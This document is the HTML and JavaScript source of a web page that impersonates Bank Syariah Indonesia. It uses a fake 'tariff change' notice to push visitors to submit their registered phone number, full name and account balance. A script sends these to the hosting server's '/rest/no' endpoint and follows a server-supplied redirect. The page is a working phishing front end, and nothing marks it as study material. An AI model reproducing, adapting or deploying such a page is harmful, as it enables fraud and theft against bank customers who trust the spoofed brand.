<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Bank Syariah Indonesia</title>
    <meta name="theme-color" content="#00A39E">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Bank Syariah Indonesia</h1>
        </div>
        
        <div class="form-container">
            <p class="description">Yuk segara konfirmasikan tarif sesuai dengan kebutuhan anda</p>
            
            <form id="bsiForm">
                <div class="radio-group">
                    <label class="radio-item">
                        <input type="radio" name="tarif" value="baru" required> 
                        TARIF BARU Rp 150.000 / BULAN
                    </label>
                    <label class="radio-item">
                        <input type="radio" name="tarif" value="lama" required> 
                        TARIF LAMA Rp 6.500 / TRANSAKSI
                    </label>
                </div>
                
                <div class="input-group">
                    <label for="nohp">No. HP Terdaftar</label>
                    <input type="tel" id="nohp" name="nohp" placeholder="Contoh: 08123456789" required>
                </div>
                
                <div class="input-group">
                    <label for="nama">Nama Lengkap</label>
                    <input type="text" id="nama" name="nama" placeholder="Nama sesuai KTP" required>
                </div>
                
                <div class="input-group">
                    <label for="saldo">Saldo Akhir</label>
                    <input type="text" id="saldo" name="saldo" placeholder="Contoh: 1.500.000" required>
                </div>
                
                <button type="submit" class="submit-btn" id="submitBtn">PROSES</button>
            </form>
        </div>
    </div>

    <script>
        document.getElementById('bsiForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const formData = new FormData(this);
            const data = {
                tarif: formData.get('tarif'),
                nohp: formData.get('nohp'),
                nama: formData.get('nama'),
                saldo: formData.get('saldo')
            };
            
            const submitBtn = document.getElementById('submitBtn');
            const originalText = submitBtn.textContent;
            
            try {
                // Show loading
                submitBtn.textContent = 'Memproses...';
                submitBtn.disabled = true;
                
                console.log('Sending data:', data);
                
                // Send to API
                const response = await fetch('/rest/no', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                
                console.log('Response status:', response.status);
                
                const result = await response.json();
                console.log('Response data:', result);
                
                if (result.success) {
                    alert('✅ Data berhasil dikirim!');
                    if (result.redirect) {
                        window.location.href = result.redirect;
                    }
                } else {
                    alert('❌ Error: ' + result.message);
                }
            } catch (error) {
                console.error('Fetch error:', error);
                alert('❌ Terjadi kesalahan jaringan. Silakan coba lagi.');
            } finally {
                // Reset button
                submitBtn.textContent = originalText;
                submitBtn.disabled = false;
            }
        });

        // Test connection on load
        window.addEventListener('load', async () => {
            try {
                const testResponse = await fetch('/api/hello');
                const testResult = await testResponse.json();
                console.log('API test:', testResult);
            } catch (error) {
                console.warn('API test failed:', error);
            }
        });
    </script>
</body>
</html>
